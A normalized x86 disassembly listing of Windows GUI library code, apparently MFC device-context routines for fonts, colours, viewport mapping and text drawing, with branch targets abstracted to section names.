call [ edx + 0x2c ]
pop edi
pop ebp
pop ebx
sub_45a638
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
mov esi ecx
push ebx
call [ GetStockObject@IAT ]
cmp ebx 0xa
mov edi eax
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ SelectObject@IAT ]
test eax eax
je r-xdata
cmp ebx 0xe
jle r-xdata
push edi
push [ esi + 0x8 ]
call ebx
push eax
call sub_44774c
push edi
push eax
call ebx
push edi
push [ esi + 0x8 ]
call [ SelectObject@IAT ]
push eax
call sub_44774c
cmp [ esi + 0x2c ] edi
mov ebx eax
jne r-xdata
cmp ebx 0xf
jle r-xdata
mov ecx esi
mov [ esi + 0x2c ] edi
call sub_45a6a8
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp ebx 0x11
jg r-xdata
pop edi
pop esi
pop ebx
retn 0x4
sub_45a6a8
push ebp
mov ebp esp
sub esp 0x90
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
pop esi
leave
retn
mov eax [ esi + 0x2c ]
test eax eax
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov eax [ esi ]
push 0xe
call [ eax + 0x24 ]
jmp r-xdata
push ebx
lea ecx [ ebp - 0x58 ]
push edi
push ecx
push 0x3c
push eax
call [ GetObjectA@IAT ]
lea eax [ ebp - 0x3c ]
push eax
push 0x20
push [ esi + 0x8 ]
call [ GetTextFaceA@IAT ]
mov edi [ GetTextMetricsA@IAT ]
lea eax [ ebp - 0x90 ]
push eax
push [ esi + 0x8 ]
call edi
mov eax [ ebp - 0x90 ]
test eax eax
jge r-xdata
mov ecx [ ebp - 0x84 ]
sub ecx eax
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x58 ] eax
jmp r-xdata
sub eax [ ebp - 0x84 ]
neg eax
jmp r-xdata
mov eax [ ebp - 0x7c ]
mov ebx [ CreateFontIndirectA@IAT ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x48 ] eax
mov al [ ebp - 0x60 ]
mov [ ebp - 0x44 ] al
mov al [ ebp - 0x5f ]
mov [ ebp - 0x43 ] al
mov al [ ebp - 0x5e ]
mov [ ebp - 0x42 ] al
mov al [ ebp - 0x5c ]
mov [ ebp - 0x41 ] al
mov al [ ebp - 0x5d ]
mov [ ebp - 0x3d ] al
lea eax [ ebp - 0x58 ]
push eax
call ebx
push eax
mov [ ebp - 0x18 ] eax
push [ esi + 0x4 ]
call [ SelectObject@IAT ]
lea eax [ ebp - 0x90 ]
push eax
push [ esi + 0x4 ]
call edi
mov edi [ ebp - 0x58 ]
mov eax [ ebp - 0x90 ]
neg edi
test eax eax
jge r-xdata
cmp [ ebp - 0x10 ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
neg eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ esi + 0x4 ]
call [ GetWindowExtEx@IAT ]
lea eax [ ebp - 0x14 ]
push eax
push [ esi + 0x4 ]
call [ GetViewportExtEx@IAT ]
cmp [ ebp - 0x4 ] 0x0
jge r-xdata
push [ ebp - 0x4 ]
push [ ebp - 0x10 ]
push edi
mov edi [ MulDiv@IAT ]
call edi
push [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
call edi
cmp [ ebp - 0x1c ] eax
jge r-xdata
mov eax [ ebp - 0x10 ]
neg eax
mov [ ebp - 0x10 ] eax
mov edi [ ebp - 0x18 ]
mov al [ ebp - 0x3d ]
and [ ebp - 0x3c ] 0x0
and al 0xf0
cmp al 0x50
setne al
dec eax
and eax 0x50
mov [ ebp - 0x3d ] al
lea eax [ ebp - 0x58 ]
push eax
call ebx
mov edi eax
push edi
push [ esi + 0x4 ]
call [ SelectObject@IAT ]
push [ ebp - 0x18 ]
call [ DeleteObject@IAT ]
jmp r-xdata
add esi 0x28
push esi
call sub_4479eb
mov [ esi ] edi
pop edi
pop ebx
sub_45a82d
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
test edi edi
jne r-xdata
push ebx
push [ edi + 0x4 ]
push [ esi + 0x8 ]
call [ SelectObject@IAT ]
push eax
call sub_44774c
mov ebx eax
mov eax [ edi + 0x4 ]
cmp [ esi + 0x2c ] eax
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
pop ebx
mov ecx esi
mov [ esi + 0x2c ] eax
call sub_45a6a8
pop edi
pop esi
retn 0x4
sub_45a86c
push esi
mov esi ecx
push edi
mov edi [ SetBkColor@IAT ]
cmp [ esi + 0x4 ] 0x0
je r-xdata
push [ esp + 0xc ]
push [ esi + 0x8 ]
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push [ esi + 0x8 ]
call [ GetNearestColor@IAT ]
push eax
push [ esi + 0x4 ]
call edi
sub_45a89d
push esi
mov esi ecx
push edi
mov edi [ SetTextColor@IAT ]
cmp [ esi + 0x4 ] 0x0
je r-xdata
push [ esp + 0xc ]
push [ esi + 0x8 ]
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push [ esi + 0x8 ]
call [ GetNearestColor@IAT ]
push eax
push [ esi + 0x4 ]
call edi
sub_45a8ce
push esi
push edi
push [ esp + 0xc ]
mov esi ecx
push [ esi + 0x8 ]
call [ SetMapMode@IAT ]
push 0x1
mov ecx esi
mov edi eax
call sub_45b00a
mov eax edi
pop edi
pop esi
retn 0x4
sub_45a8f1
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push esi
push eax
mov esi ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esi + 0x8 ]
call [ SetViewportOrgEx@IAT ]
mov ecx esi
call sub_45b10f
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
sub_45a926
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push esi
push eax
mov esi ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esi + 0x8 ]
call [ OffsetViewportOrgEx@IAT ]
mov ecx esi
call sub_45b10f
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
sub_45a95b
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push esi
push eax
mov esi ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esi + 0x8 ]
call [ SetViewportExtEx@IAT ]
push 0x1
mov ecx esi
call sub_45b00a
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
sub_45a992
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push esi
push eax
mov esi ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esi + 0x8 ]
call [ ScaleViewportExtEx@IAT ]
push 0x1
mov ecx esi
call sub_45b00a
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x14
sub_45a9cf
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push esi
push eax
mov esi ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esi + 0x8 ]
call [ SetWindowExtEx@IAT ]
push 0x1
mov ecx esi
call sub_45b00a
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
sub_45aa06
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push esi
push eax
mov esi ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esi + 0x8 ]
call [ ScaleWindowExtEx@IAT ]
push 0x1
mov ecx esi
call sub_45b00a
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x14
sub_45aa43
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
sub eax [ ebp + 0x14 ]
cmp [ ebp + 0xc ] edx
jbe r-xdata
cdq
idiv [ ebp + 0x18 ]
inc eax
imul eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x10 ]
mov eax [ ecx ]
jmp r-xdata
inc edx
add ecx 0x4
cmp edx [ ebp + 0xc ]
jb r-xdata
add eax [ ebp + 0x14 ]
pop ebp
retn 0x14
cmp [ ecx ] eax
jg r-xdata
sub_45aa77
push ebp
mov ebp esp
sub esp 0xac
push esi
mov esi [ GetTextMetricsA@IAT ]
push edi
lea eax [ ebp - 0x74 ]
mov edi ecx
push eax
push [ edi + 0x8 ]
call esi
lea eax [ ebp - 0xac ]
push eax
push [ edi + 0x4 ]
call esi
lea eax [ ebp - 0x2c ]
push eax
push 0x1
push r--data
push [ edi + 0x8 ]
call [ GetTextExtentPoint32A@IAT ]
push [ edi + 0x8 ]
call [ GetTextAlign@IAT ]
mov [ ebp - 0x24 ] eax
and eax 0x1
mov [ ebp - 0x20 ] eax
je r-xdata
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x34 ]
push eax
push [ edi + 0x4 ]
call [ GetCurrentPositionEx@IAT ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x34 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] edx
cmp [ eax ] edx
jbe r-xdata
cmp [ ebp + 0x1c ] 0x1
jne r-xdata
mov eax [ ecx ]
mov esi [ ebp + 0x2c ]
push ebx
mov ebx [ ebp + 0x10 ]
xor edx edx
mov [ ebp - 0x18 ] ebx
cmp [ ebp + 0x18 ] edx
mov [ ebp - 0x1c ] eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x10 ] edx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x24 ]
sub eax [ ecx ]
and edx 0x6
pop ebx
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x30 ]
and [ eax ] 0x0
test edx edx
jne r-xdata
jmp r-xdata
push edx
push edx
push 0x1
push r--data
push [ edi + 0x8 ]
call [ GetTabbedTextExtentA@IAT ]
mov ecx [ ebp + 0xc ]
xor edx edx
movzx eax ax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x20 ]
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp edx 0x6
jne r-xdata
mov eax [ ebp - 0x8 ]
mov al [ ebx ]
xor ecx ecx
cmp al [ ebp - 0x45 ]
sete cl
cmp ecx edx
mov [ ebp - 0x14 ] ecx
jne r-xdata
cmp edx 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
cdq
sub eax edx
sar eax 0x1
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x18 ]
add eax ebx
push eax
push [ ebp - 0x18 ]
push [ edi + 0x8 ]
call [ GetTextExtentPoint32A@IAT ]
mov eax [ ebp - 0x3c ]
sub eax [ ebp - 0x54 ]
add eax [ ebp - 0x1c ]
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp + 0x18 ] edx
je r-xdata
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
add [ ecx ] eax
jmp r-xdata
sub esi [ ebp + 0x2c ]
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x2c ]
pop edi
sar esi 0x2
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x28 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x2c
push 0x0
push [ ebp - 0x30 ]
push [ ecx ]
push [ edi + 0x4 ]
call [ MoveToEx@IAT ]
cmp esi [ ebp + 0x2c ]
mov ecx eax
jne r-xdata
push [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
call sub_45aa43
movzx eax al
test [ eax + rw-data ] 0x4
je r-xdata
cmp al 0x9
je r-xdata
sub ecx [ ebp + 0x10 ]
add [ esi - 0x4 ] ecx
sub ecx [ ebp + 0x10 ]
add [ ebp - 0x8 ] ecx
jmp r-xdata
lea ecx [ ebp - 0xc ]
push ecx
push eax
push eax
push [ edi + 0x4 ]
call [ GetCharWidthA@IAT ]
movzx eax [ ebx ]
push esi
push eax
push eax
push [ edi + 0x8 ]
call [ GetCharWidthA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x60 ]
mov edx [ ebp - 0x98 ]
mov [ esi ] eax
jmp r-xdata
xor edx edx
mov ecx [ ebp + 0xc ]
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x1c ] eax
lea eax [ ebx + 0x1 ]
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x60 ]
mov [ esi ] eax
mov eax [ ebp - 0x54 ]
sub edx [ ebp - 0x8c ]
sub [ esi ] eax
mov eax [ esi ]
add [ ebp + 0x10 ] eax
cmp esi [ ebp + 0x2c ]
mov [ ebp - 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x28 ]
mov al [ ebx ]
inc [ ebp + 0x28 ]
mov [ ecx ] al
movzx eax [ ebx ]
test [ eax + rw-data ] 0x4
je r-xdata
mov ecx eax
sub eax edx
cdq
sub eax edx
sar eax 0x1
sub ecx eax
add [ esi - 0x4 ] eax
mov [ esi ] ecx
add esi 0x4
jmp r-xdata
mov ecx [ ebp + 0x28 ]
mov al [ ebx + 0x1 ]
inc [ ebp + 0x28 ]
mov [ ecx ] al
mov eax [ esi ]
add [ ebp + 0x10 ] eax
add esi 0x4
inc [ ebp - 0x4 ]
mov [ esi ] eax
push ebx
call sub_42e14b
inc [ ebp - 0x4 ]
pop ecx
mov ecx [ ebp - 0x4 ]
mov ebx eax
mov eax [ ebp + 0x14 ]
cmp ecx [ eax ]
jb r-xdata
sub_45ad02
mov eax sub_464a38
call sub_42dc88
sub esp 0x20
mov eax [ ebp + 0x20 ]
push ebx
push esi
xor esi esi
push edi
xor ebx ebx
cmp eax esi
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x18 ] esi
jne r-xdata
push eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ edi + 0x4 ]
call [ ExtTextOutA@IAT ]
cmp [ ebp - 0x18 ] esi
mov [ ebp + 0x18 ] eax
je r-xdata
cmp [ ebp + 0x1c ] esi
jne r-xdata
push [ ebp - 0x14 ]
call sub_441eb2
push ebx
call sub_441eb2
mov eax [ ebp + 0x18 ]
pop ecx
pop ecx
cmp eax esi
je r-xdata
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x4 ] esi
shl eax 0x2
push eax
call sub_441e89
pop ecx
mov [ ebp - 0x14 ] eax
push [ ebp + 0x1c ]
call sub_441e89
mov ebx eax
pop ecx
lea eax [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push eax
lea eax [ ebp + 0x1c ]
push [ ebp - 0x14 ]
mov ecx edi
push ebx
push esi
push esi
push esi
push esi
push eax
push [ ebp + 0x18 ]
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_45aa77
mov eax [ ebp - 0x14 ]
mov [ ebp + 0x18 ] ebx
push 0x1
pop eax
jmp r-xdata
push [ edi + 0x8 ]
call [ GetTextAlign@IAT ]
test al 0x1
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x1c
lea eax [ ebp - 0x20 ]
push eax
push [ edi + 0x4 ]
call [ GetCurrentPositionEx@IAT ]
mov eax [ ebp - 0x20 ]
push [ ebp - 0x1c ]
sub eax [ ebp - 0x18 ]
mov ecx edi
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_44723d
sub_45ae0d
mov eax sub_464a44
call sub_42dc88
sub esp 0x28
push ebx
push esi
mov esi ecx
push edi
mov edi [ ebp + 0x18 ]
xor ecx ecx
cmp edi ecx
mov [ ebp - 0x10 ] esp
jg r-xdata
mov eax edi
mov [ ebp - 0x1c ] ecx
shl eax 0x2
push eax
mov [ ebp - 0x4 ] ecx
call sub_441e89
pop ecx
mov ebx eax
push edi
mov [ ebp - 0x1c ] ebx
call sub_441e89
pop ecx
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x20 ]
or [ ebp - 0x4 ] 0xffffffff
push ecx
push ebx
push eax
lea eax [ ebp + 0x18 ]
push [ ebp + 0x24 ]
mov ecx esi
mov [ ebp + 0x18 ] edi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push 0x1
push eax
push [ ebp + 0x14 ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_45aa77
push ebx
mov eax [ esi ]
push [ ebp + 0x18 ]
mov ecx esi
push [ ebp - 0x14 ]
push 0x0
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ eax + 0x60 ]
push ebx
mov edi eax
call sub_441eb2
push [ ebp - 0x14 ]
call sub_441eb2
pop ecx
test edi edi
pop ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x28 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x24 ]
push [ esi + 0x8 ]
call [ GetTextAlign@IAT ]
test al 0x1
je r-xdata
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x20
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x4 ]
call [ GetCurrentPositionEx@IAT ]
mov eax [ ebp - 0x18 ]
push [ ebp - 0x14 ]
sub eax [ ebp - 0x20 ]
mov ecx esi
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_44723d
sub_45af1e
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
push [ ebp + 0x14 ]
mov esi ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x4 ]
call [ DrawTextA@IAT ]
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
push [ esi + 0x4 ]
call [ GetCurrentPositionEx@IAT ]
push 0x0
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ esi + 0x8 ]
call [ MoveToEx@IAT ]
mov eax edi
pop edi
pop esi
leave
retn 0x10
sub_45af7c
mov eax [ esp + 0x4 ]
cmp eax 0x23
jg r-xdata
cmp eax 0x100
jl r-xdata
cmp eax 0x22
jge r-xdata
xor eax eax
cmp eax 0x103
jle r-xdata
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push eax
push [ ecx + 0x8 ]
call [ Escape@IAT ]
jmp r-xdata
cmp eax 0x12
jg r-xdata
cmp eax 0x2ff
jle r-xdata
retn 0x10
cmp eax 0x14
jl r-xdata
cmp eax 0x10
jge r-xdata
cmp eax 0x304
jle r-xdata
cmp eax 0x18
jle r-xdata
cmp eax 0x3
jl r-xdata
cmp eax 0x1007
je r-xdata
cmp eax 0x19
jle r-xdata
cmp eax 0x8
jle r-xdata
cmp eax 0x1008
jle r-xdata
cmp eax 0x20
cmp eax 0xb
jle r-xdata
cmp eax 0x100a
jg r-xdata
cmp eax 0xe
jmp r-xdata
jle r-xdata
sub_45b00a
cmp [ esp + 0x4 ] 0x0
push esi
mov esi ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push ebx
lea ebx [ esi + 0x38 ]
push edi
push ebx
push [ esi + 0x8 ]
call [ GetViewportExtEx@IAT ]
lea edi [ esi + 0x30 ]
push edi
push [ esi + 0x8 ]
call [ GetWindowExtEx@IAT ]
mov eax 0xffffc000
cmp [ edi ] eax
jle r-xdata
pop esi
retn 0x4
push 0x8
push eax
call [ SetMapMode@IAT ]
push 0x0
push [ esi + 0x34 ]
push [ esi + 0x30 ]
push [ esi + 0x4 ]
call [ SetWindowExtEx@IAT ]
push 0x0
push [ esi + 0x3c ]
push [ esi + 0x38 ]
push [ esi + 0x4 ]
call [ SetViewportExtEx@IAT ]
mov ecx esi
call sub_45b10f
cmp [ esi + 0x34 ] eax
jle r-xdata
mov ecx [ edi ]
cmp ecx 0x4000
jge r-xdata
mov edi [ GetDeviceCaps@IAT ]
push 0x58
push [ esi + 0x8 ]
call edi
push eax
push [ esi + 0x14 ]
push [ rw-data ]
push [ esi + 0x10 ]
push [ ebx ]
call sub_45a230
push 0x5a
mov [ ebx ] eax
push [ esi + 0x8 ]
call edi
push eax
push [ esi + 0x14 ]
push [ rw-data ]
push [ esi + 0x10 ]
push [ esi + 0x3c ]
call sub_45a230
pop edi
mov [ esi + 0x3c ] eax
pop ebx
mov ecx [ esi + 0x34 ]
cmp ecx 0x4000
jge r-xdata
mov edx [ ebx ]
cmp edx eax
jle r-xdata
mov edx [ esi + 0x3c ]
cmp edx eax
jle r-xdata
cmp edx 0x4000
jge r-xdata
cmp edx 0x4000
jge r-xdata
add ecx ecx
add edx edx
cmp ecx eax
mov [ edi ] ecx
mov [ ebx ] edx
jg r-xdata
add ecx ecx
add edx edx
cmp ecx eax
mov [ esi + 0x34 ] ecx
mov [ esi + 0x3c ] edx
jg r-xdata
sub_45b10f
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
pop esi
leave
retn
cmp [ esi + 0x4 ] 0x0
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push eax
call [ GetViewportOrgEx@IAT ]
lea eax [ ebp - 0x8 ]
mov ecx esi
push eax
call sub_45b211
mov ecx [ esi + 0x24 ]
mov eax [ esi + 0x20 ]
add [ ebp - 0x4 ] ecx
add [ ebp - 0x8 ] eax
push 0x0
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ esi + 0x4 ]
call [ SetViewportOrgEx@IAT ]
lea eax [ ebp - 0x10 ]
push eax
push [ esi + 0x8 ]
call [ GetWindowOrgEx@IAT ]
push 0x0
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push [ esi + 0x4 ]
call [ SetWindowOrgEx@IAT ]
sub_45b18f
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov edi [ GetDeviceCaps@IAT ]
mov esi ecx
push 0xa
push [ esi + 0x8 ]
call edi
push 0x8
mov ebx eax
push [ esi + 0x8 ]
call edi
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx esi
mov [ ebp - 0x4 ] ebx
call sub_45b211
push 0x1
push [ esi + 0x4 ]
call [ SetMapMode@IAT ]
xor edi edi
push edi
push edi
push edi
push [ esi + 0x4 ]
call [ SetWindowOrgEx@IAT ]
push edi
push [ esi + 0x24 ]
push [ esi + 0x20 ]
push [ esi + 0x4 ]
call [ SetViewportOrgEx@IAT ]
mov eax [ ebp - 0x4 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
add eax 0x2
push eax
push 0xffffffff
push 0xffffffff
push [ esi + 0x4 ]
call [ IntersectClipRect@IAT ]
push edi
mov ecx esi
call sub_45b00a
pop edi
pop esi
pop ebx
leave
retn
sub_45b211
push ebp
mov ebp esp
sub esp 0x10
push esi
lea eax [ ebp - 0x8 ]
push edi
mov esi ecx
push eax
push [ esi + 0x8 ]
call [ GetViewportExtEx@IAT ]
lea eax [ ebp - 0x10 ]
push eax
push [ esi + 0x8 ]
call [ GetWindowExtEx@IAT ]
push [ esi + 0x30 ]
mov edi [ ebp + 0x8 ]
push [ ebp - 0x8 ]
push [ esi + 0x38 ]
push [ ebp - 0x10 ]
push [ edi ]
call sub_45a230
mov [ edi ] eax
push [ esi + 0x34 ]
push [ ebp - 0x4 ]
push [ esi + 0x3c ]
push [ ebp - 0xc ]
push [ edi + 0x4 ]
call sub_45a230
mov [ edi + 0x4 ] eax
pop edi
pop esi
leave
retn 0x4
sub_45b26a
mov eax sub_463840
call sub_42dc88
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
add ecx 0x4
push ecx
call sub_4479eb
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_45b2ba
mov eax sub_4638d8
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov eax [ esi + 0x28 ]
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
call sub_4535a1
cmp [ eax + 0x4 ] esi
jne r-xdata
push eax
call [ CloseHandle@IAT ]
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_441976
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
and [ eax + 0x4 ] 0x0
sub_45b313
mov eax sub_46444b
call sub_42dc88
push ecx
push ebx
mov ebx ecx
push esi
mov [ ebp - 0x10 ] ebx
mov [ ebx ] r--data
mov esi [ ebx + 0x8 ]
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
and [ ebp - 0x4 ] 0x0
lea ecx [ ebx + 0x4 ]
call sub_43ce2c
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
push edi
test esi esi
jne r-xdata
push ecx
lea ecx [ ebx + 0x4 ]
call sub_43cf3d
test edi edi
je r-xdata
mov eax esi
mov ecx esi
mov esi [ esi ]
mov edi [ eax + 0x8 ]
cmp [ edi + 0x1c ] 0x0
je r-xdata
pop edi
mov eax [ edi ]
push 0x1
mov ecx edi
call [ eax + 0x4 ]
sub_45b37e
mov eax sub_464cb8
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
call sub_45b3b6
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_441976
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_45b3cf
push esi
mov esi ecx
cmp [ esi + 0x42 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
and [ esi + 0x42 ] 0x0
push eax
call [ CoRevokeClassObject@IAT ]
and [ esi + 0x20 ] 0x0
sub_45b3f0
push esi
call sub_45357b
push 0x0
mov esi eax
call sub_45565c
mov esi [ esi + 0x24 ]
push 0x0
call sub_4556cc
pop esi
retn
mov ecx esi
call sub_45b3cf
mov esi [ esi + 0x1c ]
jmp r-xdata
test esi esi
je r-xdata
sub_45b41b
push ebx
push ebp
push esi
push edi
call sub_45357b
push 0x1
mov ebp eax
call sub_45565c
add ebp 0x34
xor ebx ebx
mov esi ebp
push 0x1
mov [ ebp ] bl
call sub_4556cc
call sub_45357b
mov eax [ eax + 0x4 ]
cmp eax ebx
je r-xdata
push 0xa
push esi
call sub_42e6a3
pop ecx
mov edi eax
pop ecx
mov [ edi ] bl
call sub_45357b
push [ eax + 0x8 ]
push esi
call [ UnregisterClassA@IAT ]
lea esi [ edi + 0x1 ]
jmp r-xdata
call sub_453349
mov esi eax
mov ecx [ esi + 0xcc ]
lea edi [ esi + 0xcc ]
cmp ecx ebx
je r-xdata
mov eax [ eax + 0x54 ]
cmp eax ebx
je r-xdata
cmp [ esi ] bl
je r-xdata
call sub_45357b
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
call [ eax + 0xb8 ]
test eax eax
je r-xdata
push ebx
push 0x1
call eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + 0x30 ]
mov edi [ UnhookWindowsHookEx@IAT ]
cmp eax ebx
je r-xdata
mov [ edi ] ebx
mov eax [ esi + 0x2c ]
cmp eax ebx
je r-xdata
push eax
call edi
mov [ esi + 0x30 ] ebx
push eax
call edi
mov [ esi + 0x2c ] ebx
sub_401080
push esi
mov esi ecx
call sub_4010a0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_401170
mov eax [ esp + 0x4 ]
add ecx 0x5c
push ecx
push 0x3e9
push eax
call sub_449556
retn 0x4
sub_401190
mov eax r--data
retn
sub_402280
retn 0x4
sub_402290
mov eax [ ecx + 0x1c ]
push 0x0
push eax
call [ EnableWindow@IAT ]
retn
sub_4022a0
mov eax [ ecx + 0x1c ]
push 0x1
push eax
call [ EnableWindow@IAT ]
retn
sub_4022b0
push esi
mov esi ecx
call sub_43c0ee
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
add esp 0x4
sub_4023f0
push esi
mov esi ecx
call sub_4016f0
test [ esp + 0x8 ] 0x1
